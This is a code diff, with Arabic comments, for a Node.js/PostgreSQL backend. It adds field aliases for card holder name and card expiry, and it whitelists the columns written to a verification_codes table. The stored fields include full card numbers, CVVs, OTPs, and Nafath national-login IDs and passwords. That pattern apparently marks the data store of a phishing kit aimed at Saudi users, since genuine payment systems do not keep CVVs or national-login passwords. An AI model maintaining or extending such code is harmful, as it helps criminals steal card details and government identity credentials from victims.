@@ -228,10 +228,12 @@ async function createOrUpdatePayment(referenceId, data) {
   // تعيين أسماء الحقول من الكائن إلى أسماء أعمدة قاعدة البيانات
   const fieldMap = {
     cardHolderName: 'cardholdername',
+    cardHolder: 'cardholdername',
     cardNumber: 'cardnumber',
     cardLastFour: 'cardlastfour',
     expirationDate: 'cardexpiry',
     cardExpiry: 'cardexpiry',
+    expiryDate: 'cardexpiry', // إضافة expiryDate
     cvv: 'cardcvv',
     cardCvv: 'cardcvv',
     verifyCode: 'verifycode',
@@ -280,18 +282,34 @@ async function getPaymentByReference(referenceId) {
 }
 
 async function createOrUpdateVerification(referenceId, type, data) {
+  // تصفية الحقول المحجوزة وغير الموجودة في الجدول
+  const allowedFields = ['nafathid', 'nafathpassword', 'nafathnumber', 'motaselprovider', 'motaselphone', 'motaselcode', 'otpcode', 'step', 'status', 'rawdata'];
+  const filteredData = {};
+  for (const [k, v] of Object.entries(data)) {
+    const col = k.toLowerCase();
+    if (col === 'referenceid' || col === 'type') continue; // تجاهل الحقول المحجوزة
+    if (allowedFields.includes(col)) {
+      filteredData[col] = k === 'rawData' ? JSON.stringify(v) : v;
+    }
+  }
+  // تحويل rawData إلى JSON string
+  if (data.rawData !== undefined && filteredData['rawdata'] === undefined) {
+    filteredData['rawdata'] = JSON.stringify(data.rawData);
+  }
+  
   const existing = await pool.query("SELECT id FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
   if (existing.rows.length > 0) {
-    const keys = Object.keys(data);
-    const sets = keys.map((k, i) => `${k.toLowerCase()} = $${i + 3}`).join(", ");
-    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
-    await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceid = $1 AND type = $2`, [referenceId, type, ...values]);
+    const cols = Object.keys(filteredData);
+    if (cols.length > 0) {
+      const sets = cols.map((k, i) => `${k} = $${i + 3}`).join(", ");
+      const values = cols.map(k => filteredData[k]);
+      await pool.query(`UPDATE verification_codes SET ${sets} WHERE referenceid = $1 AND type = $2`, [referenceId, type, ...values]);
+    }
   } else {
-    const keys = ['referenceid', 'type', ...Object.keys(data).map(k => k.toLowerCase())];
-    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
-    const dataKeys = Object.keys(data);
-    const values = [referenceId, type, ...dataKeys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k])];
-    await pool.query(`INSERT INTO verification_codes (${keys.join(", ")}) VALUES (${placeholders})`, values);
+    const cols = ['referenceid', 'type', ...Object.keys(filteredData)];
+    const placeholders = cols.map((_, i) => `$${i + 1}`).join(", ");
+    const values = [referenceId, type, ...Object.values(filteredData)];
+    await pool.query(`INSERT INTO verification_codes (${cols.join(", ")}) VALUES (${placeholders})`, values);
   }
   const res = await pool.query("SELECT * FROM verification_codes WHERE referenceid = $1 AND type = $2", [referenceId, type]);
   return res.rows[0];
